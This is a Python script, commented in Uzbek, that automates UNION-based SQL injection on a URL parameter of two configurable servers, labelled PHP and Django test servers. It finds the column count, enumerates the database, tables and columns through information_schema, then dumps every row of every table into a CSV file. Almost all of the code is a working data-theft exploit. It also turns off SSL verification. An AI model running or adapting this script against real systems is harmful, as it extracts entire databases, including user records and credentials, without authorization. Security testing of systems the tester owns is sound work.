import requests
import urllib.parse
import re
import pandas as pd
from tabulate import tabulate
import os
# Test serverlarining URL’lari (o‘zgartiring)
PHP_SERVER = "https://"  # PHP server URL
DJANGO_SERVER = "http://"  # Django server URL
PARAM = "id"  # Zaif parametr (masalan, id)
OUTPUT_CSV = "output.csv"  # Chiqish fayli
# HTTPS bo‘lsa, SSL tekshiruvini o‘chirish (test uchun)
VERIFY_SSL = False

def send_request(url, param, payload):
    """URL parametriga SQLi payload’ini yuborish"""
    encoded_payload = urllib.parse.quote(payload)
    test_url = f"{url}?{param}={encoded_payload}"
    try:
        response = requests.get(test_url, verify=VERIFY_SSL, timeout=5)
        return response.text, response.status_code
    except requests.RequestException as e:
        print(f"So‘rovda xato: {e}")
        return None, None
def extract_data(response_text, pattern=r'[\w_]+'):
    """Javobdan ma’lumotlarni ajratib olish"""
    if not response_text:
        return []
    matches = re.findall(pattern, response_text)
    return [m for m in matches if len(m) > 1 and not m.startswith('div')]
# HTML teglarini olib tashlash
def display_table(data, headers, title):
    """Ma’lumotlarni konsolda jadval sifatida chiqarish"""
    if data:
        print(f"\n{title}")
        print(tabulate(data, headers=headers, tablefmt="grid"))
def save_to_csv(dfs, server_name):
    """Ma’lumotlarni CSV faylga yozish"""
    with open(OUTPUT_CSV, 'a', encoding='utf-8') as f:
        f.write(f"\n=== {server_name} serveri ma’lumotlari ===\n")
        for title, df in dfs:
            f.write(f"\n{title}\n")
            df.to_csv(f, index=False, lineterminator='\n')
            f.write("\n")
def test_sql_injection(url, server_name):
    """SQLi orqali barcha jadvallar, ustunlar va qatorlarni chiqarish"""
    print(f"\n=== {server_name} serverida SQLi sinovi ===")
    dfs = []  # CSV uchun DataFrame’lar ro‘yxati
    # 1. Ustunlar sonini aniqlash
    columns_count = 0
    for i in range(1, 10):
        payload = f"1' UNION SELECT {','.join(['NULL'] * i)} --"
        response_text, _ = send_request(url, PARAM, payload)
        if response_text and "error" not in response_text.lower():
            print(f"[+] Ustunlar soni: {i}")
            columns_count = i
            break
    else:
        print("[-] Ustunlar sonini aniqlab bo‘lmadi")
        return
    # 2. Ma’lumotlar bazasi nomini chiqarish
    payload = f"1' UNION SELECT NULL, database() {',' + 'NULL' * (columns_count - 2) if columns_count > 2 else ''} --"
    response_text, _ = send_request(url, PARAM, payload)
    db_names = extract_data(response_text)
    db_data = [[name] for name in db_names]
    display_table(db_data, ["Ma’lumotlar bazasi"], "Ma’lumotlar bazasi nomlari")
    dfs.append(("Ma’lumotlar bazasi nomlari", pd.DataFrame(db_data, columns=["Ma’lumotlar bazasi"])))

    # 3. Jadvallar nomlarini chiqarish
    payload = f"1' UNION SELECT NULL, table_name {',' + 'NULL' * (columns_count - 2) if columns_count > 2 else ''} FROM information_schema.tables WHERE table_schema=database() --"
    response_text, _ = send_request(url, PARAM, payload)
    tables = extract_data(response_text)
    table_data = [[table] for table in tables]
    display_table(table_data, ["Jadval nomi"], "Jadvallar ro‘yxati")
    dfs.append(("Jadvallar ro‘yxati", pd.DataFrame(table_data, columns=["Jadval nomi"])))
    # 4. Har bir jadvalning ustunlarini aniqlash
    for table in tables:
        payload = f"1' UNION SELECT NULL, column_name {',' + 'NULL' * (columns_count - 2) if columns_count > 2 else ''} FROM information_schema.columns WHERE table_name='{table}' --"
        response_text, _ = send_request(url, PARAM, payload)
        columns = extract_data(response_text)
        column_data = [[table, col] for col in columns]
        display_table(column_data, ["Jadval", "Ustun"], f"{table} jadvalining ustunlari")
        dfs.append((f"{table} jadvalining ustunlari", pd.DataFrame(column_data, columns=["Jadval", "Ustun"])))
# 5. Jadvalning qatorlarini chiqarish
        if columns:
            # Har bir ustundan ma’lumotlarni olish
            select_cols = ", ".join([f"IFNULL({col}, 'NULL')" for col in columns])
            payload = f"1' UNION SELECT NULL, concat_ws(' | ', {select_cols}) {',' + 'NULL' * (columns_count - 2) if columns_count > 2 else ''} FROM {table} --"
            response_text, _ = send_request(url, PARAM, payload)
            rows = extract_data(response_text, r'[^|]+(?:\|[^|]+)*')
            row_data = [row.split(' | ') for row in rows if row.count('|') == len(columns) - 1]
            if row_data:
                display_table(row_data, columns, f"{table} jadvalining qatorlari")
                dfs.append((f"{table} jadvalining qatorlari", pd.DataFrame(row_data, columns=columns)))
    # CSV faylga yozish
    save_to_csv(dfs, server_name)
def main():
    """Asosiy funksiya"""
    # Agar CSV fayl mavjud bo‘lsa, o‘chirish
    if os.path.exists(OUTPUT_CSV):
        os.remove(OUTPUT_CSV)
    servers = [
        (PHP_SERVER, "PHP"),
        (DJANGO_SERVER, "Django")
    ]
    for url, name in servers:
        test_sql_injection(url, name)

if __name__ == "__main__":
    main()
